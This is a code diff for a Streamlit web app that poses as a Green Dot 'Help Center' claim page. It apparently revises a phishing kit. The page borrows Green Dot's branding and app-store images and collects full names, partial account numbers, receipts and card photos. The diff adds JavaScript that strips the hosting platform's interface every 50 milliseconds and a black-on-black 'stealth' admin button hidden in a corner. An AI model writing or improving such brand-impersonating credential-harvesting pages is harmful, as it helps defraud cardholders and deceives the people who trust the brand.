@@ -23,7 +23,7 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# JAVASCRIPT NUCLEAR: ELIMINACIÓN AGRESIVA Y SOPORTE DE TEMAS
+# JS NUCLEAR: LIMPIEZA TOTAL CADA 50ms
 st.markdown("""<script>
     const nuclearClean = () => {
         const selectors = [
@@ -37,84 +37,73 @@ st.markdown("""<script>
             document.querySelectorAll(s).forEach(el => {
                 el.style.visibility = 'hidden';
                 el.style.display = 'none';
-                el.style.height = '0';
                 el.remove();
             });
         });
     };
-    
-    if (window.history && window.history.replaceState) {
-        const originalRS = window.history.replaceState;
-        window.history.replaceState = function() {
-            if (arguments[2] && arguments[2].includes('?')) return;
-            return originalRS.apply(this, arguments);
-        };
-    }
-    
     setInterval(nuclearClean, 50);
 </script>""", unsafe_allow_html=True)
 
-# CSS DINÁMICO PARA DARK/LIGHT MODE
+# CSS STEALTH: FONDO NEGRO Y BOTÓN INVISIBLE
 st.markdown("""<style>
-    header, footer, .stDeployButton, [data-testid="stHeader"], 
-    [data-testid="stAppToolbar"], [data-testid="stHeaderActionElements"] {
-        display: none !important;
-        visibility: hidden !important;
+    header, footer, .stDeployButton, [data-testid="stHeader"] { display: none !important; }
+    
+    /* Fondo Negro Total */
+    .stApp {
+        background-color: #000000 !important;
+        color: #FFFFFF !important;
     }
 
-    .block-container { max-width: 500px !important; padding-top: 0.5rem !important; }
+    .block-container { max-width: 500px !important; padding-top: 1rem !important; }
 
-    /* Soporte para Dark/Light Mode mediante variables de Streamlit */
-    @media (prefers-color-scheme: dark) {
-        .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
-        .admin-trigger button { background-color: #000000 !important; color: #000000 !important; }
-        .promo-box { background-color: #111; border-color: #222; }
-    }
-
-    @media (prefers-color-scheme: light) {
-        .stApp { background-color: #FFFFFF !important; color: #000000 !important; }
-        .admin-trigger button { background-color: #FFFFFF !important; color: #FFFFFF !important; }
-        .promo-box { background-color: #f9f9f9; border-color: #eee; }
-    }
-
+    /* Botón Principal (Submit) */
     .stButton > button {
-        background-color: #00a05b !important; color: white !important;
+        background-color: #00a05b !important;
+        color: white !important;
         width: 100%; border: none; height: 50px; border-radius: 8px; font-weight: bold;
     }
 
-    /* BOTÓN ADMIN CAMUFLADO */
+    /* BOTÓN ADMIN INVISIBLE (NEGRO SOBRE NEGRO) */
     .admin-trigger {
-        position: fixed; bottom: 0; left: 0; width: 50px; height: 50px; z-index: 9999;
+        position: fixed; bottom: 0; left: 0; width: 60px; height: 60px; z-index: 9999;
     }
     .admin-trigger button {
-        border: none !important; box-shadow: none !important; cursor: default !important;
-        width: 100% !important; height: 100% !important;
+        background-color: #000000 !important;
+        color: #000000 !important;
+        border: none !important;
+        box-shadow: none !important;
+        outline: none !important;
+        width: 100% !important;
+        height: 100% !important;
+        cursor: default !important;
+    }
+
+    /* Otros elementos */
+    .promo-box {
+        background-color: #111; padding: 20px; border-radius: 12px; 
+        text-align: center; margin-top: 20px; border: 1px solid #222;
     }
 </style>""", unsafe_allow_html=True)
 
 if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
 
 if not st.session_state.admin_mode:
-    if os.path.exists("logo.svg"): st.image("logo.svg")
-
+    if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
     st.title("Help Center")
-    st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v1_1_7", clear_on_submit=True):
+    with st.form("claim_v1_1_8", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
-        st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
-        st.file_uploader("Store Receipt", type=["jpg","png","jpeg"])
-        st.file_uploader("Card Front Photo", type=["jpg","png","jpeg"])
+        st.number_input("Disputed Amount", format="%.2f")
+        st.file_uploader("Store Receipt", type=["jpg","png"])
+        st.file_uploader("Card Photo", type=["jpg","png"])
         if st.form_submit_button("SUBMIT NOW"):
-            st.success("Claim Received successfully.")
+            st.success("Claim Received.")
 
-    st.markdown("""<div class='promo-box' style='padding: 25px 15px; text-align: center; border-radius: 12px; margin: 25px 0; border: 1px solid;'>
-        <h3 style='margin-bottom:15px; font-size:1.1rem;'>Download the Green Dot app</h3>
-        <div style='display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;'>
-            <a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'></a>
-            <a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'></a>
-        </div>
+    st.markdown("""<div class='promo-box'>
+        <p style='color:white;'>Download the Green Dot app</p>
+        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'>
+        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
     </div>""", unsafe_allow_html=True)
 
     st.markdown("<div class='admin-trigger'>", unsafe_allow_html=True)
@@ -122,9 +111,8 @@ if not st.session_state.admin_mode:
         st.session_state.admin_mode = True
         st.rerun()
     st.markdown("</div>", unsafe_allow_html=True)
-
 else:
     st.title("Admin Panel")
-    if st.button("Exit Admin"):
+    if st.button("Exit Admin Panel"): 
         st.session_state.admin_mode = False
         st.rerun()
